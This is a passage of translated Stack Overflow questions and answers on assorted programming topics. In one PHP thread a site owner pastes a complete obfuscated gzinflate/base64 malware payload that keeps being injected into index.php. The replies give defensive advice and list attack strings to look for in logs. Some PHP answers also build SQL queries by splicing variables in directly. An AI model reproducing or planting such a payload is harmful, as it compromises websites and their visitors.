只是为了记录，我将基于不可变集合（树和 scalax.graph [http://www.assembla.com/spaces/scala-graph/wiki](http://www.assembla.com/spaces/scala-graph/wiki)）实例化新结构。

对于 pom 的浏览，我会将它们渲染为 xhtml，为依赖项/继承注入链接，可能基于 play-framework。

如果这个项目会产生有用的东西，我会把它贴在这里......

# grails - 没有插件的 Grails 中的 DWR

> ID：10347136
> 
> 赞同：1
> 
> 时间：2012-04-27T08:15:57.653
> 
> 标签：grails, dwr

我想使用 DWR 而不在 grails 中使用他们的插件。他们的插件没有文档，也不支持最新版本。我怎样才能做到这一点..？

# asp.net - 连接 microsoft sql server 时出错

> ID：10347137
> 
> 赞同：-1
> 
> 时间：2012-04-27T08:16:09.090
> 
> 标签：asp.net, sql-server-2005

我已经安装了 Microsoft SQL Server Management Studio Express。但是安装后当我连接 SQL 服务器时，我收到以下错误。

## 标题：连接到服务器

无法连接到 S-PC。

* * *

附加信息：

建立与 SQL Server 的连接时发生与网络相关或特定于实例的错误。服务器未找到或无法访问。验证实例名称是否正确以及 SQL Server 是否配置为允许远程连接。（提供者：命名管道提供者，错误：40 - 无法打开与 SQL Server 的连接）（Microsoft SQL Server，错误：2）

请建议我一些东西来消除这个错误。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-27T08:19:34.250

看起来好像服务没有运行。运行 Services.msc，在服务列表中找到 SQL Server (MSSQLSERVER)，然后单击 Start Service 按钮。

# php - 为什么这个恶意代码一直附加到我的 index.php 文件中？

> ID：10347139
> 
> 赞同：1
> 
> 时间：2012-04-27T08:16:12.733
> 
> 标签：php, security, malware

我的网站不断被以下代码感染。我一直在删除它，也许有一天它会再次出现。请帮忙。

```
#d93065#
echo(gzinflate(base64_decode("tVXbjptADP2VNi+BRmmZgbkglr70E/qIeIgTyLLahhRQ0CrKv9c2QzbZknRVaZWLPB7P8bF9Bh7adVPtu+9VGiRd83LcN3VXdy/7IjmtV9360Su2Rb9tN/6xTLP5MpRAPx2BFrCMYSlAxWACUBaMBm1BB6DRo0CBlrRCU6Lb8M7FvolAKrABRCEoTcGhYYNjEHgpQRnGjikMl2giHiiyLDJB3JHRKysTvqKgjUABCHsVbCPiTkwM0aB08RTg7dKMJWxMiCvH1oCIJyggMqYgjwXJVeiQy8evAIFtwQ/WaQc2hiH4vKJThrct8SCT01sQzEEwFDeKslg6qjgC/UMuPOi20UX8I54KM3gbYbiagQeGDtsDIWpSRCzpvHF1YyTRD11aFbsGYbORFBGOxg5FtKQtnrDirpuhYO1aKM4aEeTBSMNIipHE2YGcpOBWTzRb8hwm532xpEPcS2Wv2C3jOxKakIfhaiggdtdB8rxvy0YNsgn4HJc9eTUG8U9oSQ61oVs54dIco1FPoZvSuakD0Fl/aIcfpcArYpc6Uv/Q0PlSvJEROm8j3tDXgHVLYvcQL7XnlH+fwajL6eD3Tub6zo7zcXfyf2b99zWfAn3/g+4Dn+GKb4FgFTEgxkjtlIC5FL9e9OTze55nQf613T9XnTeHuZ8c0lkxW8wOK/x7niWnqvQOfpH21W5T99kh55fbrug/CanGV9vvfusf+7RM2jTLk1OT/uyaardNyrrxEqXN57RKqkUq/OMTWaVX+G3aLppsVmKWBn/1rx/4/7gim6x6U8xyr8+e8i9iEQmfeRR+4bV+8vDNvWr/AA==")));
#/d93065# 
```

编辑：如果再次发生，有什么方法可以找出代码是如何产生的。可能是来自提供商还是什么？我还不得不说，我所有的帐户都被感染了，而不仅仅是一个。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:20:23.153

我的建议是您的 FTP 帐户已被盗用。更改您的 FTP 密码，不要将其存储在任何地方，清理您的网络并等待它是否有帮助。如果您将 FTP 密码存储在计算机中，请仔细检查是否存在病毒/恶意软件。某些恶意软件可能会抓取您存储在 Total Commander 的 FTP 帐户列表中的 FTP 密码。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-04-27T08:18:13.910

检查您的 php 代码。它的某处可能存在一些漏洞，允许攻击者修改您的文件。或者您的网络服务器可能容易受到攻击。

它回来的原因是因为有人（或机器人/脚本）反复这样做，而您没有保护运行应用程序的所有部分，即服务器 + 代码。

就像@pomeh 建议的那样，监视您的服务器日志以查看正在访问哪些文件以了解它是如何发生的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-27T08:19:30.240

您的网站可能已受到攻击。而且由于您不修复打开的“漏洞”，攻击者可以一次又一次地注入代码。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-04-27T15:19:20.853

我将从检查服务器日志和 ftp 日志开始，这应该可以提示您问题出在哪里。我的猜测是您的网站遭到入侵，并且用户留下了一个简单的 php shell 以供进一步访问，这是大多数情况下的情况。这可以通过查看日志来发现；这可能有点及时，并且需要一个至少在寻找什么方面没有经验的人（例如遍历包含尝试 - `../`，sql注入尝试 - `and 1=1`，xss -`<script>alert`，这些只是最基本的例子）。但是，如果存在更严重的入侵，则发现将更加困难，因为该人将能够通过摆脱日志来掩盖他的踪迹，因此为了安全起见，我可能还会检查 rootkit。此外，这取决于您是否在共享主机上，在这种情况下，服务器权限混乱可能会导致您的网站由于另一个网站受到攻击而易受攻击。很多网站都以这种方式受到攻击，大多数中小型托管服务提供商在这方面没有提供足够的安全性，基本上使您的网站只能与服务器上托管的最不安全的网站一样安全。正如在其他答案中所说，如果您使用开源解决方案，请通过 google 或例如[http://www.exploit-db.com/](http://www.exploit-db.com/)如果最近发布了任何漏洞。最后，您可能想要检查服务器及其正在运行的服务。

# javascript - 在Javascript中使用带有计时器的随机数生成器每次都会给出相同的数字

> ID：10347145
> 
> 赞同：0
> 
> 时间：2012-04-27T08:16:40.190
> 
> 标签：javascript, math, random

我正在尝试使用 javascript 制作文本幻灯片，但是在 javascript 中，数学地板函数总是返回相同的随机数。下面的代码有什么问题？

```
var randomnumber;
D=Array(7)
D[0]='Sunday!'
D[1]='Monday!'
D[2]='Tuesday!'
D[3]='Wednesday!'
D[4]='Thursday!'
D[5]='Friday!'
D[6]='Saturday!'

window.setTimeout("Tick()", 1000);    

function Tick() 
{
    document.write('<marquee><font size="+2">'+D[Math.floor(Math.random()*7)]+'</font></marquee>')    
}

</script> 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T08:20:44.497

[工作正常](http://jsfiddle.net/47f5X/)。`setTimeout`但是，在使用而不是字符串时，您必须传递对函数的引用。`setTimeout`当您将字符串传递给它时使用`eval`类似 - 的过程，从而使这种使用方法不安全。

```
function Tick() {...}

//pass a reference (no quotes)
window.setTimeout(Tick, 1000);​ 
```

* * *

`setTimeout`仅在达到超时时触发一次。如果您想做一个恒定的，连续的`Tick`，那么最好使用`setInterval`它，它会触发并“重新加载”以再次触发。

* * *

这是[代码的修改版本](http://jsfiddle.net/47f5X/8/)以适合您的描述

```
//create the marquee and add to body 
var marquee = document.createElement('marquee');
document.body.appendChild(marquee);

function Tick() {
    //generate the random text
    var randomDay = D[Math.floor(Math.random() * 7)];

    //change the existing marquee text
    //textContent for compliant browsers
    //innerText for IE
    marquee.textContent = randomDay;
}

//tick every second
window.setInterval(Tick, 1000);​ 
```

# java - 用Java查询数据库后返回一个数组

> ID：10347148
> 
> 赞同：3
> 
> 时间：2012-04-27T08:16:51.843
> 
> 标签：java, sql-server, jdbc

我必须查询一个 MSSQL 数据库，并且我希望查询的结果以 Array 或 ArrayList 的形式返回。

我现在有这个代码，但它给出了一个错误。我有一个到数据库的连接，所以这不是问题。

```
public ArrayList<Array> queryResult(String q) throws SQLException {

   ArrayList<Array> array = new ArrayList<>();
   Statement statement = this.getConnection().createStatement();
   ResultSet rs = statement.executeQuery(q);

   while(rs.next()) {

      Array n = rs.getArray(rs.getRow());
      System.out.println(n);
      array.add(n);

   }
   return array;
} 
```

我收到以下错误

```
Exception in thread "main" com.microsoft.sqlserver.jdbc.SQLServerException: This operation is not supported.
      at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:190)
      at com.microsoft.sqlserver.jdbc.SQLServerResultSet.NotImplemented(SQLServerResultSet.java:750)
      at com.microsoft.sqlserver.jdbc.SQLServerResultSet.getArray(SQLServerResultSet.java:2625)
      at server.Database.queryResult(Database.java:52)
      at server.Server.listen(Server.java:57)
      at server.Server.run(Server.java:34) at
      server.Server.<init>(Server.java:28) at
      server.Server.main(Server.java:94) Java Result: 1 
```

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-04-27T08:37:28.967

`getArray()`将当前行的特定列的值作为数组返回。看到这个 - [http://docs.oracle.com/javase/6/docs/api/java/sql/ResultSet.html#getArray%28int%29](http://docs.oracle.com/javase/6/docs/api/java/sql/ResultSet.html#getArray%28int%29)

如果您想将行值作为数组获取，那么您必须为此编写代码。

```
while (rs.next()){
     java.util.ArrayList alRowData = new java.util.ArrayList();
     java.sql.ResultSetMetaData rsmd = rs.getMetaData();
     int numberOfColumns = rsmd.getColumnCount();
     for(int columnIndex = 1; columnIndex <= numberOfColumns; columnIndex ++){
          alRowData.add(rs.getObject(columnIndex));
     }
     System.out.println(alRowData);
} 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:39:55.480

您的异常跟踪显示：

```
Exception in thread "main" com.microsoft.sqlserver.jdbc.SQLServerException: This operation is not supported.
at com.microsoft.sqlserver.jdbc.SQLServerException.makeFromDriverError(SQLServerException.java:190)
at com.microsoft.sqlserver.jdbc.SQLServerResultSet.NotImplemented(SQLServerResultSet.java:750)
at com.microsoft.sqlserver.jdbc.SQLServerResultSet.getArray(SQLServerResultSet.java:2625) 
```

似乎您使用的 SQLDriver 没有实现该[`getArray(int)`](http://docs.oracle.com/javase/6/docs/api/java/sql/ResultSet.html#getArray%28int%29)方法，因此引发了此异常。

您可能需要最新的驱动程序、支持或替代解决方案来解决此问题。

**编辑**：
如果您真的想获取当前`Row`或您`Record`的`ResultSet`调用，`getRow()`并且`getArray(..)`将无法正常工作，并且 AFAIK 此类实现不可用。

# git - 是否可以跟踪另一个存储库中的文件历史记录

> ID：10347151
> 
> 赞同：1
> 
> 时间：2012-04-27T08:17:03.613
> 
> 标签：git, version-control, dvcs

这是场景：

我们有一个包含一些文件夹的“官方”存储库。此文件夹由用户 A 拥有，用户 A 应该是唯一允许推送的文件夹：

 `````
repoA
 |
 -- folderA1
  |
  |- fileA11 .. fileA12
 |
 -- folderA2
  |
  |.... 
````  `用户 B 需要维护自己的文件夹 A1 副本（来自 repoA），并且应该能够将用户 A 推送的提交合并到自己的副本中。用户 B 不想要文件夹 A2

当然，用户 B 将对他自己的文件夹 A1 副本进行一些修改，并且文件夹 A1 的历史记录（从用户 B 的角度来看）应该如下所示：

 `````
HEAD
|
*    Merge user A master into user B master
| \
* |  Last commit made by user A
* |  Previous commit made by user A
| *  Last commit made by user B
| *  Previous commit made by user B
|/
*    Initial commits made by user A
*
*
| 
````  `用户 B 在他自己的存储库中不应有文件夹 A2（来自用户 A）。

用户 B 应该能够在他自己的存储库中拥有文件夹 B1 和文件夹 B2。

谢谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-04-30T07:56:59.593

考虑到您可以在存储库级别控制写访问（例如，通过[Gitolite](http://sitaramc.github.com/gitolite/why.html)），最好`folderA1`是：

*   自己的 Git 存储库
*   `repoA`作为[子模块](http://book.git-scm.com/5_submodules.html)引用。

[控制谁更新子树合并](http://progit.org/book/ch6-7.html)会更复杂。````

# java - 如何暂停/恢复或更改 TimerTask 的周期时间？

> ID：10347155
> 
> 赞同：1
> 
> 时间：2012-04-27T08:17:16.277
> 
> 标签：java, multithreading, locking, scheduled-tasks

我最初的目的是每 xx TimeUnit 执行一段代码，而不是简单地循环它并检查一个标志。我做了一些研究，发现了两个解决方案：

1.  `Timer`+ `TimerTask`- 一旦计时器暂停，您必须重新更新另一个。TimerTask 也是如此。

2.  `ScheduledThreadPoolExecutor`+ `Runnable`- 与前面的组合相同。但有人说这是增强版。但它仍然不提供我之前提到的功能。

现在，我正在寻找一种优雅的方法来解决这个问题。也许我应该专注于锁？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:22:51.087

我会使用 ScheduledExecutorService 并使用 Future.cancel() 暂停。并 scheduleAtFixedRate 再次启动它。

如果要更改期间，请取消并在新期间再次添加它，假设它没有暂停。

如果你想隐藏这个细节，你可以创建一个带有 suspend()、resume() 和 setPeriod() 方法的包装器。

# java - 独立 Java 应用程序的规则引擎

> ID：10347161
> 
> 赞同：1
> 
> 时间：2012-04-27T08:17:43.537
> 
> 标签：java, rules, rule-engine

我有一个独立的 Java 应用程序，我必须为此集成一个规则引擎。我应该使用属性文件或 XML 文件来定义规则。我需要规则引擎来读取属性或 XML 文件中定义的这些规则，并相应地在应用程序中实现代码。

任何这样的规则引擎***（开源）***，我都可以将它用于我的应用程序。请注意，我不希望在应用程序服务器或 Web 服务器中部署任何规则引擎。我需要某种 jar 文件，我可以在其中直接将其用于我的应用程序。

如果我可以使用任何这样的规则引擎，请指导我？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:22:12.010

你可以选择 Drools，它也可以在独立程序中使用。

[http://www.jboss.org/drools](http://www.jboss.org/drools)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-03-31T09:14:24.457

插头警报！

我有偏见，因为这是我自己的项目，但如果你想要一个非常快速和轻量级的规则引擎，你可以查看[Roolie](https://sourceforge.net/projects/roolie/)。

该项目背后的理念是基于我个人的经验，即 JSR-94 太过分了，大多数规则引擎都太重了，依赖关系太多，学习曲线陡峭。

Roolie 没有解决改变应用程序状态的“功能性”规则（那些应该是 Java 无论如何，恕我直言）。

相反，它允许开发人员使用单个“通过”方法实现简单的规则，并将它们与 XML 文件中的短路布尔逻辑链接在一起。它没有任何运行时依赖，而且速度非常快。

这是一个简单问题的简单解决方案（即用户可以看到文件吗？只有当他们“登录”、“管理员”或“高级用户”和“有足够的帖子”时）。

复合规则是“UserCanSeeFile”，由“IsLoggedIn”、“IsAdmin”、“IsPowerUser”和“HasEnoughPosts”组成。

如果稍后您不关心他们必须有多少帖子让他们看到一个文件，只需拉出该 XML 行，您就完成了。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2015-03-06T00:07:19.023

我在java中尝试了一些表达式评估库。我发现 MVEL 是最好的。就我而言，我正在从数据库中读取“规则”。所以我的规则看起来像

player.platform == 'iOS' && ( player.ltv > 100 || player.status >= GOLD )

现在我所做的是为所有变量解析上面的表达式。在我的情况下，变量是带有点（ object.method ）的任何标记。它对我有用。不确定它是否对你有用。

但是一旦所有变量都替换为值。我刚刚调用了一个 MVEL.evaluate()。

此外，在我的情况下，我需要评估的所有表达式都将以布尔结果给出。但是 MVEL 可以评估具有不同结果类型的任何表达式。

* * *

## 回答 #4

> 赞同：-1
> 
> 时间：2012-04-27T08:28:44.010

我推荐你[流口水](http://www.jboss.org/drools)

[也检查其他选项](http://java-source.net/open-source/rule-engines)

# android - android onactivityresult没有被调用

> ID：10347162
> 
> 赞同：0
> 
> 时间：2012-04-27T08:17:48.543
> 
> 标签：android, android-activity

我有一个普通的 java 类（不是一个活动），我以下列方式开始一个意图

```
Intent intent = new Intent(context,VerifActivity.class);

              ((Activity) context).startActivityForResult(intent, 2);

public void onActivityResult(int requestCode, int resultCode, Intent data) {

        System.out.println("result code is"+resultCode);
        System.out.println("selectedposn is"+selectedPosition);
            } 
```

问题是没有打印 SOP，即没有调用 onactivity 结果。setresult 在 VerifActivity.class 中被调用。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:20:57.200

如果它不是 Activity，则不会调用 onActivityResult。您从中获取上下文的 Activity 将被调用。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-04-27T08:20:53.523

`onActivityResult(int requestCode, int resultCode, Intent data)`是 Activity 类方法不适用于任何 JAVA 类。它仅适用于 Android Activity 本身。

# php - 如果数据库中没有行，字段仍应出现

> ID：10347165
> 
> 赞同：0
> 
> 时间：2012-04-27T08:17:55.400
> 
> 标签：php

在我的表单上，我有一个回显链接到我的数据库中的数据。但是，如果这是第一次访问表单（表中没有与会话相关的 ID），则文本框不会出现，而它们应该出现但为空！当id链接到会话并且数据库中有一行时成功（用户已经完成了一次表单并返回编辑。）我希望这是有道理的。为了更清楚一点，如果用户第一次访问表单，文本区域应该在那里（它们现在消失）但是是空的。

```
 $rs_settings = mysql_query("SELECT * from thesis WHERE user_id = $user_id;");

     <br>

  <form action="thesis.php" method="post" name="regForm" id="regForm" >

  <?php while ($row_settings = mysql_fetch_array($rs_settings)) {?>

      Title of Proposed Thesis<span class="required">*</span>

      <textarea name="thesis_Name" type="text" style="width:500px; height:150px" 

      id="thesis_Name" size="600"><?php echo $row_settings['thesis_Name']; ?>   
      </textarea> 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:23:31.063

使用[mysql_num_rows()](http://php.net/manual/en/function.mysql-num-rows.php)

```
 <form action="thesis.php" method="post" name="regForm" id="regForm" >
<?php
$num_rows = mysql_num_rows($rs_settings);
if($num_rows > 0) { ?>
<?php while ($row_settings = mysql_fetch_array($rs_settings)) {?>

//your textarea with values from database

<?php } 
} else { ?>
//empty textares
<textarea></textarea>

<?php } ?> 
```

你的意思是这样的吗

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T10:36:02.873

请尝试下面给出的代码，它可能会有所帮助..

```
<form action="thesis.php" method="post" name="regForm" id="regForm" >

    <?php if (mysql_num_rows($rs_settings) <= 0) { ?>
        <textarea name = "thesis_Name" type = "text" style = "width:500px; height:150px"

                id = "thesis_Name" size = "600"></textarea>
                <?php
            } else {
                while ($row_settings = mysql_fetch_array($rs_settings)) {
                    ?>

            Title of Proposed Thesis<span class="required">*</span>

            <textarea name="thesis_Name" type="text" style="width:500px; height:150px" 

                    id="thesis_Name" size="600"><?php echo $row_settings['thesis_Name']; ?>   
            </textarea>
            <?php
        }
    }?> 
```

这里`mysql_num_rows($query)`首先检查结果是否存在任何行

但如果表单有多个字段，那么

```
<?php
$rs_settings = mysql_query("SELECT * from thesis WHERE user_id = {$user_id}") or die(mysql_error());
$result = array();
if (mysql_num_rows($rs_settings) == 0) {
    $result[0]['thesis_Name'] = "";
    $result[0]['field1'] = "";
} else {
    $i = 0;
    while ($res = mysql_fetch_array($rs_settings)) {
        $result[$i] = $res;
        $i++;
    }
}
foreach ($result AS $index => $r) {
    ?>

    Title of Proposed Thesis<span class="required">*</span>

    <textarea name="thesis_Name" type="text" style="width:500px; height:150px" 

            id="thesis_Name" size="600"><?php echo $r['thesis_Name']; ?>   
    </textarea>
<?php } ?> 
```

# javascript - 如何使链接在 Twitter 推文中起作用？API + json

> ID：10347166
> 
> 赞同：1
> 
> 时间：2012-04-27T08:18:00.520
> 
> 标签：javascript, jquery, json, twitter

任何人都可以让我的推特链接工作吗？
我试图在 Twitter API 页面上找到答案，但找不到..

在这里看到[我的 jsfiddle](http://jsfiddle.net/Autodealers/XSmYa/)。

提前谢谢你！
亲切的问候，
乔纳森

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-04-27T08:29:55.883

将此函数添加到您的代码以解析 URL：

```
function parseLinks(tweet) {
    return tweet.replace(/[A-Za-z]+:\/\/[A-Za-z0-9-_]+\.[A-Za-z0-9-_:%&\?\/.=]+/g, function (tweet) {
        return tweet.link(tweet);
    });
}; 
```

然后在显示之前通过这个函数解析推文的文本：

```
timeline.append(
    $('<li>').append(
        $('<strong>').text(created_at),
        $('<span>').html('<br />' + parseLinks(_this.text))
    )
); 
```

[**示例小提琴**](http://jsfiddle.net/XSmYa/10/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:32:01.640

```
var words = _this.text.split(/\s+/);
for (var i=0; i<words.length; i++) {
    var word = words[i];
    if (word.substr(0, 7) == 'http://' || word.substr(0, 8) == 'https://') {
        words[i] = '<a href="'+word+'">'+word+'</a> ';
    }
}
var text = words.join(' '); 
```

# c - 声明空数组

> ID：10347176
> 
> 赞同：5
> 
> 时间：2012-04-27T08:18:43.507
> 
> 标签：c, memory

我正在编写一个复制文件的程序。我使用了一个缓冲区来存储[`read()`](http://linux.die.net/man/2/read)函数提供的信息，然后将这些数据提供给[`write()`](http://linux.die.net/man/2/write)函数。我使用了这个声明：

```
static void buffer[BUFFER_SIZE]; 
```

问题是我得到了错误`error: declaration of ‘buffer’ as array of voids`。

我不明白为什么声明一个 void 数组是一个错误。如何声明没有特定类型的内存块？

* * *

## 回答 #1

> 赞同：13
> 
> 时间：2012-04-27T08:36:25.710

> 我不明白为什么声明一个 void 数组是一个错误。

您不能声明数组的技术原因`void`是它`void`是**不完整的类型，无法完成**。必须知道数组元素的大小，但 void 类型没有大小。请注意，您同样无法声明 void 对象，如

```
void foo; 
```

请注意，指向 void 的指针具有特定的大小，这就是为什么

```
void *foo; 
```

是有效的，以及`sizeof(foo)`，但`sizeof(*foo)`将是无效的。

> 如何声明没有特定类型的内存块？

`char`对于通用内存缓冲区，请使用普通或`unsigned char`（或什至`uint8_t`）数组。`char`当我需要将指针传递给函数族时，我通常更喜欢简单`str*` ，其中数组`unsigned char`会导致关于不兼容指针的诊断。

* * *

## 回答 #2

> 赞同：5
> 
> 时间：2012-04-27T08:20:00.780

`char`使用or的数组`unsigned char`。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2012-04-27T08:26:41.537

声明数组时，编译器必须知道数组的大小。void 类型没有大小。所以编译器报错。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2014-03-16T21:55:28.940

这就是你的做法，虽然它不是你可能想要的 void 数组，但它是一个 void 指针数组；在这个 void 指针的每个单元格中，您可以分配任何内容。

如果您想存储变量，只需将其转换为 ( `void*`)，这是一个示例：

```
void *XPoint[5] = { 0 };
XPoint[0] = (void*)5;   // int
XPoint[1] = "Olololo!"; // char*
XPoint[2] = (void*)'x'; // char
XPoint[3] = (void*)structA.nNum; // struct int 
```

* * *

## 回答 #5

> 赞同：-1
> 
> 时间：2012-04-27T08:23:32.540

您还可以声明 void 指针：

```
void* buffer;

// just pointers for simple work with allocated piece of memory
char* chBuf;
long* intBuf; 
```

然后对该指针使用 malloc() 并像使用任何数组（char、short、long、float、double 或您自己的类型）一样使用这块内存。在这种情况下，不要忘记使用 free() 来避免内存泄漏。

```
buffer = malloc (BUFFER_SIZE);
if (buffer==NULL)
  exit (1);

// init our buffers
chBuf=(*char)buffer;
intBuf=(*long)buffer; 
```

# nhibernate - NHibernate：在细节具有多对一关系的主细节中解决 N+1？

> ID：10347177
> 
> 赞同：0
> 
> 时间：2012-04-27T08:18:50.657
> 
> 标签：nhibernate, query-optimization, lazy-loading, eager-loading

我有一个包含 OrderLines 集合的订单。每个 OrderLine 都有一个多对一的产品。对于所有订单，我有一个搜索窗口——默认情况下——在网格中显示所有订单。使用同一个窗口，我可以过滤包含给定产品的所有订单。我们的客户每天产生大约 700 个订单，订单平均有大约 35 行。

在搜索窗口中，我只显示存储在 Order 对象本身中的信息。但是，如果我过滤特定产品，它将初始化我与 OrderLine 集合的延迟加载关系以及与我的 OrderLine 中的产品的多对一关系。每个订单行被逐行查询，并且对于每一行，对产品表都有一个单独的查询。

所以平均每个订单我得到 35 个查询来初始化所有 OrderLine，加上 35 个查询来获取与该订单相关的产品。

一次加载所有订单行及其相关产品（如果不可能，每个订单的所有订单行）的最佳方式是什么？我知道我可以将我的多对一映射到 orderline 中的产品作为 fetch="join"，但这仍然会给我留下 35 个单个查询来获取 orderlines+products。

仅供参考：目前我加载所有东西都是懒惰的。

有什么建议么？我可以在这里使用 Future 吗？

问候，特德

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-04-27T08:45:44.693

你的`batch-size`设置是什么？

保持延迟加载不变，在两个集合映射上将其设置为 35，这应该将 1 + 35 + 35 个查询减少到 1 + 1 + 1。

```
<bag ... batch-size='35' ..> 
```

同样正如 Stefan 所指出的，您还需要 `batch-size='35'`在课程上进行设置。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-27T08:31:01.327

在这种情况下，我不会检索订单实体本身。我将创建一个“视图”类，并通过使用 NHibernate 项目，我将返回那些仅包含您感兴趣的信息的“视图”类，并将其放在概览表单或页面中。搜索时，您可以执行一个新查询（只有一个），该查询检索您感兴趣的“OrderView”实例。

当您想要编辑订单或查看其详细信息时，我会加载实体。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-04-29T21:56:13.897

您是否对加载的实体在内存中进行过滤操作？通常，您只想对那些包含相关产品订单行的订单执行查询。因此，您只需要根据查询结果填充您的窗口。无需遍历所有订单和所有订单行来填充仅包含一小部分数据的窗口。

在数据库服务器上进行过滤通常比从服务器获取所有数据并在 C# 中进行过滤要快得多。

您的描述对我来说并不完全清楚：鉴于您已经过滤了要显示的订单，您是否需要访问订单行和产品？
- 如果没有，您可以使用上述解决方案。
- 如果是，您可以对过滤后的订单查询进行连接提取，以直接将订单行与订单一起加载。连接获取不仅适用于 <many-to-one>，也适用于 <one-to-many>，因此您可以一次加载一些根实体及其子实体。如果根实体有很多很多列和多个子实体，则存在一些缺点，因为查询会为每个子实体冗余地检索根实体的数据。然而，在许多情况下（取决于整个系统配置）连接获取的好处远远超过了成本。

在您查询数据并且事先不清楚以下代码实际需要哪些数据的情况下，使用批量选择（使用 <batch-size>）可以帮助大大减少数据库往返次数。

# python - py.test 运行 Python2 和 Python3

> ID：10347178
> 
> 赞同：8
> 
> 时间：2012-04-27T08:19:02.330
> 
> 标签：python, python-3.x, pytest

我编写了一个包（[http://github.com/anntzer/parsedcmd](http://github.com/anntzer/parsedcmd)），它可以同时运行 Python2 和 Python3。但是，我不得不为 Python2 和 Python3 编写单独的 (py.test) 单元测试（主要是因为我想测试 Python3 的额外功能，特别是仅关键字参数），所以我在子包中有 a`test_py2.py`和 a 。现在，如果我运行，比如说，通过，但失败了。同样，对于,通过但失败（尽管我可以使这个工作，这只是移至的问题）。`test_py3.py``test``py.test2 mypkg``test_py2``test_py3``SyntaxError``py.test3 mypkg``test_py3``test_py2``StringIO``io`

我可以设计`test`子包，以便`import mypkg.test`只导入正确版本的测试，但显然 py.test 并不关心——它只看到两个匹配的文件`test_*`并抓取它们中的所有测试，而忽略`__init__.py`告诉他导入的内容。

所以现在我必须同时做`py.test2 mypkg/test/test_py2.py`和`py.test3 mypkg/test/test_py3.py`。有没有办法设置整个事情，以便`py.test2 mypkg`“`py.test3 mypkg`正常工作”？

谢谢。

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-05-23T20:12:42.190

如果您可以使您的模块可在所有解释器上导入并酌情跳过测试是一种常见的解决方案。否则，您可以将以下内容作为“conftest.py”放入测试目录：

```
import sys
py3 = sys.version_info[0] >= 3

class DummyCollector(pytest.collect.File):
   def collect(self):
      return []

def pytest_pycollect_makemodule(path, parent):
  bn = path.basename 
  if "py3" in bn and not py3 or ("py2" in bn and py3):
     return DummyCollector(path, parent=parent) 
```

这会获取一个特定于项目的插件，并将正确忽略文件名包含错误解释器版本上的“py2”或“py3”子字符串的测试模块。当然，您可以将其细化为直接在 conftest.py 文件中显示一个列表，而不是检查文件名 etc.pp。

HTH，霍尔格

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-04-29T18:04:14.653

您可以将测试放在不同的包中，并只运行相应包中的测试。或者您可以在脚本中加载适当的测试模块：

```
import sys, unittest

cur_version = sys.version_info

if cur_version[0] < 3:
   import myApp.test.test_py2
   unittest.TestLoader().loadTestsFromModule(myApp.test.test_py2).run()
else:
   import myApp.test.test_py3
   unittest.TestLoader().loadTestsFromModule(myApp.test.test_py3).run() 
```

或者，使用一个`setup.py`文件，以便您可以运行：

`python setup.py test`

并将版本控制逻辑放在那里：

```
versionedTestSuite = "parsedcmd.test.test_py2" # do something as above here
setup(name='parsedcmd',
      ...
      test_suite=versionedTestSuite,
      ) 
```

# php - 使用“加载数据文件”时如何记录错误并将其写入日志文件？

> ID：10347179
> 
> 赞同：0
> 
> 时间：2012-04-27T08:19:03.587
> 
> 标签：php, mysql

我在使用“加载数据本地 infile”从 CSV 文件导入数据时遇到问题。当部分记录存在约束问题时，整个记录插入失败。

我用过 ：

```
$sql = "LOAD DATA LOCAL INFILE ...";
$exec = mysql_unbuffered_query($sql);
if ($exec === false) {
    echo "mysql_error : ".mysql_error()."<br/>";
}
else {
    echo "Success execute";
} 
```

但它不断终止查询。

我期望做的是继续插入记录，**除了**一些有约束问题的记录，并使用 PHP 捕获/记录错误+数据到日志文件。

有可能实现吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T08:26:48.500

**尝试这个 ：**

```
<?php

$sql = "LOAD DATA LOCAL INFILE ...";
$exec = mysql_unbuffered_query($sql);
if ($exec === false) {
    $error_message = "mysql_error : ".mysql_error()."\n";
    error_log($error_message, 3, "your_log_file.txt");
}
else {
    echo "Success execute";
}

?> 
```

* * *

***PS**并尝试接受@ManseUK提到的答案；这表明您尊重社区（下次社区将非常乐意为您提供更多帮助......）*

# android - 将 res 文件夹放在 android apk 扩展文件上

> ID：10347183
> 
> 赞同：0
> 
> 时间：2012-04-27T08:19:23.860
> 
> 标签：android, apk, google-play

我在 res-drawable 文件夹中有一个包含大量数据资源的应用程序，是否可以将 res 文件夹放在扩展文件中，或者我需要更改代码？我试图在扩展文件文档中阅读有关此内容，但无法弄清楚。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-04-27T11:22:31.533

> 是否可以将res文件夹放在扩展文件中

不，对不起。

> 我需要更改代码

是的。

# android - 区别以及何时使用 getApplication()、getApplicationContext()、getBaseContext() 和 someClass.this

> ID：10347184
> 
> 赞同：131
> 
> 时间：2012-04-27T08:19:27.437
> 
> 标签：android, android-intent, this, toast, android-context

